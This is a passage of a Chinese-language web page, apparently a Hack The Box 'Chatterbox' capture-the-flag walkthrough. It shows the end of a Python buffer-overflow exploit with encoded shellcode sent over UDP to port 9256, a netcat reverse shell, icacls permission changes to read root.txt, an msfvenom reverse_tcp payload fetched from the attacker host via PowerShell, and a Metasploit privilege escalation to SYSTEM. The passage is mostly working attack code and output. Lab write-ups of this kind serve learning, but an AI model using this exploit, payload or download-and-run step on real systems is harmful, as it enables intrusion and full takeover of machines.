+<a id="__codelineno-3-48" name="__codelineno-3-48" href="#__codelineno-3-48"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x52\x30\x31\x58\x4d\x59\x55\x30\x52\x4b\x4b\x50\x4b</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-49" name="__codelineno-3-49" href="#__codelineno-3-49"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x4f\x38\x55\x52\x30\x50\x50\x42\x30\x32\x30\x51\x30</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-50" name="__codelineno-3-50" href="#__codelineno-3-50"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x32\x30\x51\x30\x52\x30\x43\x38\x4a\x4a\x4c\x4f\x49</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-51" name="__codelineno-3-51" href="#__codelineno-3-51"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x4f\x49\x50\x4b\x4f\x38\x55\x56\x37\x32\x4a\x4c\x45</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-52" name="__codelineno-3-52" href="#__codelineno-3-52"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x43\x38\x4b\x5a\x4c\x4a\x4e\x30\x4d\x33\x32\x48\x4d</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-53" name="__codelineno-3-53" href="#__codelineno-3-53"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x32\x4b\x50\x4e\x31\x51\x4c\x55\x39\x39\x56\x31\x5a</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-54" name="__codelineno-3-54" href="#__codelineno-3-54"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x4c\x50\x32\x36\x50\x57\x42\x48\x56\x39\x35\x55\x53</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-55" name="__codelineno-3-55" href="#__codelineno-3-55"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x44\x51\x51\x4b\x4f\x4a\x35\x44\x45\x57\x50\x53\x44</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-56" name="__codelineno-3-56" href="#__codelineno-3-56"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x4c\x4c\x4b\x4f\x30\x4e\x4c\x48\x34\x35\x4a\x4c\x43</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-57" name="__codelineno-3-57" href="#__codelineno-3-57"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x38\x4a\x50\x56\x55\x35\x52\x50\x56\x4b\x4f\x38\x55</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-58" name="__codelineno-3-58" href="#__codelineno-3-58"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x33\x38\x43\x33\x52\x4d\x42\x44\x4d\x30\x55\x39\x59</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-59" name="__codelineno-3-59" href="#__codelineno-3-59"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x53\x42\x37\x30\x57\x50\x57\x30\x31\x4b\x46\x52\x4a</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-60" name="__codelineno-3-60" href="#__codelineno-3-60"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x4d\x42\x50\x59\x51\x46\x59\x52\x4b\x4d\x52\x46\x37</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-61" name="__codelineno-3-61" href="#__codelineno-3-61"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x57\x50\x44\x4e\x44\x4f\x4c\x4d\x31\x4d\x31\x54\x4d</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-62" name="__codelineno-3-62" href="#__codelineno-3-62"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x50\x44\x4d\x54\x4c\x50\x48\x46\x4d\x30\x51\x34\x42</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-63" name="__codelineno-3-63" href="#__codelineno-3-63"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x34\x32\x30\x52\x36\x30\x56\x32\x36\x31\x36\x42\x36</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-64" name="__codelineno-3-64" href="#__codelineno-3-64"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x30\x4e\x52\x36\x30\x56\x50\x53\x52\x36\x32\x48\x34</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-65" name="__codelineno-3-65" href="#__codelineno-3-65"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x39\x58\x4c\x4f\x4f\x44\x46\x4b\x4f\x58\x55\x33\x59</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-66" name="__codelineno-3-66" href="#__codelineno-3-66"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x4b\x30\x50\x4e\x42\x36\x31\x36\x4b\x4f\x4e\x50\x33</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-67" name="__codelineno-3-67" href="#__codelineno-3-67"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x38\x4d\x38\x44\x47\x4d\x4d\x33\x30\x4b\x4f\x5a\x35</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-68" name="__codelineno-3-68" href="#__codelineno-3-68"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x57\x4b\x39\x50\x4d\x4d\x4d\x5a\x4b\x5a\x42\x48\x45</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-69" name="__codelineno-3-69" href="#__codelineno-3-69"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x56\x56\x35\x47\x4d\x45\x4d\x4b\x4f\x48\x55\x4f\x4c</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-70" name="__codelineno-3-70" href="#__codelineno-3-70"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x4c\x46\x43\x4c\x4c\x4a\x53\x50\x4b\x4b\x49\x50\x32</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-71" name="__codelineno-3-71" href="#__codelineno-3-71"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x55\x4b\x55\x37\x4b\x50\x47\x4d\x43\x33\x42\x42\x4f</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-72" name="__codelineno-3-72" href="#__codelineno-3-72"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x42\x4a\x4b\x50\x50\x53\x4b\x4f\x38\x55\x41\x41</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-73" name="__codelineno-3-73" href="#__codelineno-3-73"></a>
+<a id="__codelineno-3-74" name="__codelineno-3-74" href="#__codelineno-3-74"></a><span class="k">def</span> <span class="nf">main</span> <span class="p">(</span><span class="n">buf</span><span class="p">):</span>
+<a id="__codelineno-3-75" name="__codelineno-3-75" href="#__codelineno-3-75"></a>    <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_DGRAM</span><span class="p">)</span>
+<a id="__codelineno-3-76" name="__codelineno-3-76" href="#__codelineno-3-76"></a>    <span class="n">server_address</span> <span class="o">=</span> <span class="p">(</span><span class="s1">&#39;10.10.10.74&#39;</span><span class="p">,</span> <span class="mi">9256</span><span class="p">)</span>
+<a id="__codelineno-3-77" name="__codelineno-3-77" href="#__codelineno-3-77"></a>
+<a id="__codelineno-3-78" name="__codelineno-3-78" href="#__codelineno-3-78"></a>    <span class="n">fs</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x55\x2A\x55\x6E\x58\x6E\x05\x14\x11\x6E\x2D\x13\x11\x6E\x50\x6E\x58\x43\x59\x39</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-79" name="__codelineno-3-79" href="#__codelineno-3-79"></a>    <span class="n">p</span>  <span class="o">=</span> <span class="s2">&quot;A0000000002#Main&quot;</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="s2">&quot;Z&quot;</span><span class="o">*</span><span class="mi">114688</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">10</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-80" name="__codelineno-3-80" href="#__codelineno-3-80"></a>    <span class="n">p</span> <span class="o">+=</span> <span class="s2">&quot;A0000000002#Main&quot;</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">57288</span> <span class="o">+</span> <span class="s2">&quot;AAAAASI&quot;</span><span class="o">*</span><span class="mi">50</span> <span class="o">+</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="p">(</span><span class="mi">3750</span><span class="o">-</span><span class="mi">46</span><span class="p">)</span>
+<a id="__codelineno-3-81" name="__codelineno-3-81" href="#__codelineno-3-81"></a>    <span class="n">p</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x62</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">45</span>
+<a id="__codelineno-3-82" name="__codelineno-3-82" href="#__codelineno-3-82"></a>    <span class="n">p</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x61\x40</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-83" name="__codelineno-3-83" href="#__codelineno-3-83"></a>    <span class="n">p</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x2A\x46</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-84" name="__codelineno-3-84" href="#__codelineno-3-84"></a>    <span class="n">p</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x43\x55\x6E\x58\x6E\x2A\x2A\x05\x14\x11\x43\x2d\x13\x11\x43\x50\x43\x5D</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="s2">&quot;C&quot;</span><span class="o">*</span><span class="mi">9</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\x60\x43</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-85" name="__codelineno-3-85" href="#__codelineno-3-85"></a>    <span class="n">p</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x61\x43</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\x2A\x46</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-86" name="__codelineno-3-86" href="#__codelineno-3-86"></a>    <span class="n">p</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x2A</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="n">fs</span> <span class="o">+</span> <span class="s2">&quot;C&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">157</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">fs</span><span class="p">)</span><span class="o">-</span> <span class="mi">31</span><span class="o">-</span><span class="mi">3</span><span class="p">)</span>
+<a id="__codelineno-3-87" name="__codelineno-3-87" href="#__codelineno-3-87"></a>    <span class="n">p</span> <span class="o">+=</span> <span class="n">buf</span> <span class="o">+</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">1152</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">))</span>
+<a id="__codelineno-3-88" name="__codelineno-3-88" href="#__codelineno-3-88"></a>    <span class="n">p</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">10</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-89" name="__codelineno-3-89" href="#__codelineno-3-89"></a>
+<a id="__codelineno-3-90" name="__codelineno-3-90" href="#__codelineno-3-90"></a>    <span class="nb">print</span> <span class="n">bcolours</span><span class="o">.</span><span class="n">GREEN</span> <span class="o">+</span> <span class="s2">&quot;[&quot;</span> <span class="o">+</span> <span class="n">bcolours</span><span class="o">.</span><span class="n">TURQ</span> <span class="o">+</span> <span class="s2">&quot;+&quot;</span> <span class="o">+</span> <span class="n">bcolours</span><span class="o">.</span><span class="n">GREEN</span> <span class="o">+</span> <span class="s2">&quot;]&quot;</span> <span class="o">+</span> <span class="n">bcolours</span><span class="o">.</span><span class="n">ENDC</span> <span class="o">+</span> <span class="s2">&quot; BUFFER OVERFLOW PAYLOAD RELEASED -- CHECK YOUR HANDLER&quot;</span>
+<a id="__codelineno-3-91" name="__codelineno-3-91" href="#__codelineno-3-91"></a>
+<a id="__codelineno-3-92" name="__codelineno-3-92" href="#__codelineno-3-92"></a>    <span class="n">i</span><span class="o">=</span><span class="mi">0</span>
+<a id="__codelineno-3-93" name="__codelineno-3-93" href="#__codelineno-3-93"></a>    <span class="k">while</span> <span class="n">i</span><span class="o">&lt;</span><span class="nb">len</span><span class="p">(</span><span class="n">p</span><span class="p">):</span>
+<a id="__codelineno-3-94" name="__codelineno-3-94" href="#__codelineno-3-94"></a>        <span class="k">if</span> <span class="n">i</span> <span class="o">&gt;</span> <span class="mi">172000</span><span class="p">:</span>
+<a id="__codelineno-3-95" name="__codelineno-3-95" href="#__codelineno-3-95"></a>            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">1.0</span><span class="p">)</span>
+<a id="__codelineno-3-96" name="__codelineno-3-96" href="#__codelineno-3-96"></a>        <span class="n">sent</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">sendto</span><span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="n">i</span><span class="p">:(</span><span class="n">i</span><span class="o">+</span><span class="mi">8192</span><span class="p">)],</span> <span class="n">server_address</span><span class="p">)</span>
+<a id="__codelineno-3-97" name="__codelineno-3-97" href="#__codelineno-3-97"></a>        <span class="n">i</span> <span class="o">+=</span> <span class="n">sent</span>
+<a id="__codelineno-3-98" name="__codelineno-3-98" href="#__codelineno-3-98"></a>    <span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+<a id="__codelineno-3-99" name="__codelineno-3-99" href="#__codelineno-3-99"></a>
+<a id="__codelineno-3-100" name="__codelineno-3-100" href="#__codelineno-3-100"></a><span class="k">if</span> <span class="vm">__name__</span><span class="o">==</span><span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+<a id="__codelineno-3-101" name="__codelineno-3-101" href="#__codelineno-3-101"></a>    <span class="n">main</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+</code></pre></div>
+<h2 id="shell">反弹shell<a class="headerlink" href="#shell" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>┌──(root💀kali)-[~/Desktop/Chatterbox]
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>└─# nc -lnvp 4444
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>listening on [any] 4444 ...
+<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>connect to [10.10.16.3] from (UNKNOWN) [10.10.10.74] 49157
+<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>Microsoft Windows [Version 6.1.7601]
+<a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+<a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>
+<a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>C:\Windows\system32&gt;whoami
+<a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>whoami
+<a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a>chatterbox\alfred
+<a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a>
+<a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a>C:\Windows\system32&gt;
+</code></pre></div>
+<h1 id="_3">提权<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h1>
+<p>当前对于Administrator的桌面文件夹有完全控制权限，因此我们无需提权就可以读取root.txt</p>
+<blockquote>
+<p>icacls 是 Windows 操作系统中的一个命令行工具，用于管理文件和文件夹的访问控制列表 (ACL, Access Control List)。ACL 是一个表，定义了用户或组对文件或文件夹的访问权限。使用 icacls 工具，可以查看、设置、修改和备份这些权限。</p>
+<p>显示文件或文件夹的权限：icacls filename</p>
+<p>为文件或文件夹添加权限：icacls filename /grant UserName:(permissions)</p>
+<p>删除文件或文件夹的权限：icacls filename /remove UserName</p>
+<p>替换文件或文件夹的权限：icacls filename /replace UserName:(permissions)</p>
+<p>备份文件或文件夹的权限：icacls filename /save aclfile /t    (aclfile 是保存权限信息的文件，/t 表示包括子目录)</p>
+<p>恢复文件或文件夹的权限：icacls filename /restore aclfile</p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>c:\Users\Administrator\Desktop&gt;icacls ./
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>icacls ./
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>./ NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>   CHATTERBOX\Administrator:(I)(OI)(CI)(F)
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>   BUILTIN\Administrators:(I)(OI)(CI)(F)
+<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>   CHATTERBOX\Alfred:(I)(OI)(CI)(F)
+</code></pre></div>
+<p><img alt="截图" src="6bb8bfbb3c3c76ba54dc42e521da8f5c.png" /></p>
+<p><img alt="截图" src="ec1795b2643f8ab809843600b10d2c3a.png" /></p>
+<p><img alt="截图" src="92fe8565b0a7097167404f08b6ac2a18.png" /></p>
+<p><img alt="截图" src="c33335cc18d193a968e7a3371036b0c5.png" /></p>
+<p>只是对root.txt没有读权限</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>c:\Users\Administrator\Desktop&gt;icacls root.txt
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>icacls root.txt
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>root.txt CHATTERBOX\Administrator:(F)
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>
+<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>Successfully processed 1 files; Failed processing 0 files
+</code></pre></div>
+<p>只需要对alfred赋予完全控制权限操作root.txt，就可以操作读取该文件</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>c:\Users\Administrator\Desktop&gt;icacls root.txt /grant alfred:F
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>processed file: root.txt
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>Successfully processed 1 files; Failed processing 0 files
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>c:\Users\Administrator\Desktop&gt;type root.txt
+<a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>type root.txt
+<a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>4148f631....
+</code></pre></div>
+<h2 id="winpeas">传winpeas枚举<a class="headerlink" href="#winpeas" title="Permanent link">&para;</a></h2>
+<p>编译一个meterpreter <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.3 LPORT=4455 -f exe &gt; shell.exe</code></p>
+<p>传到靶机
+<code>powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.16.3:8000/shell.exe','c:\Users\Alfred\Desktop\shell.exe')"</code></p>
+<p>拿到shell以后执行<code>post/multi/recon/local_exploit_suggester</code></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>meterpreter &gt; run post/multi/recon/local_exploit_suggester
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>[*] 10.10.10.74 - Collecting local exploits for x86/windows...
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>[*] 10.10.10.74 - 37 exploit checks are being tried...
+<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>[+] 10.10.10.74 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
+<a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>nil versions are discouraged and will be deprecated in Rubygems 4
+<a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>[+] 10.10.10.74 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
+<a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>[+] 10.10.10.74 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
+<a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a>[+] 10.10.10.74 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
+<a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a>[+] 10.10.10.74 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+<a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a>[+] 10.10.10.74 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
+<a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a>[+] 10.10.10.74 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+<a id="__codelineno-8-13" name="__codelineno-8-13" href="#__codelineno-8-13"></a>[+] 10.10.10.74 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
+<a id="__codelineno-8-14" name="__codelineno-8-14" href="#__codelineno-8-14"></a>[+] 10.10.10.74 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
+<a id="__codelineno-8-15" name="__codelineno-8-15" href="#__codelineno-8-15"></a>[+] 10.10.10.74 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
+</code></pre></div>
+<p>使用模块<code>exploit/windows/local/ntusermndragover</code>提权到system</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>msf6 exploit(windows/local/ntusermndragover) &gt; run
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>[*] Started reverse TCP handler on 10.10.16.3:4444 
+<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>[*] Executing automatic check (disable AutoCheck to override)
+<a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>[+] The target appears to be vulnerable.
+<a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>[*] Launching notepad.exe to host the exploit...
+<a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>[+] Process 5532 launched.
+<a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a>[*] Injecting exploit into 5532 ...
+<a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a>[*] Exploit injected. Injecting payload into 5532...
+<a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a>[*] Payload injected. Executing exploit...
+<a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a>[*] Sending stage (175174 bytes) to 10.10.10.74
+<a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a>[*] Meterpreter session 8 opened (10.10.16.3:4444 -&gt; 10.10.10.74:49165) at 2022-01-07 04:32:54 -0500
+<a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a>
+<a id="__codelineno-9-14" name="__codelineno-9-14" href="#__codelineno-9-14"></a>meterpreter &gt; getuid
+<a id="__codelineno-9-15" name="__codelineno-9-15" href="#__codelineno-9-15"></a>Server username: NT AUTHORITY\SYSTEM
+</code></pre></div>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  回到页面顶部
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright &copy; 2024 hypnotic
+    </div>
+  
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../../..", "features": ["header.autohide", "navigation.instant", "navigation.tracking", "content.code.annotate", "toc.integrate", "toc.follow", "navigation.path", "navigation.top", "navigation.tabs", "navigation.prune", "navigation.footer", "navigation.tabs.sticky", "navigation.sections", "content.code.copy", "navigation.indexes", "search.share", "search.suggest", "search.highlight"], "search": "../../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.83f73b43.min.js"></script>
+      
+        <script src="../../../javascripts/extra.js"></script>
+      
+        <script src="../../../javascripts/mathjax.js"></script>
+      
+        <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+      
+        <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+      
+    
+  </body>
+</html>
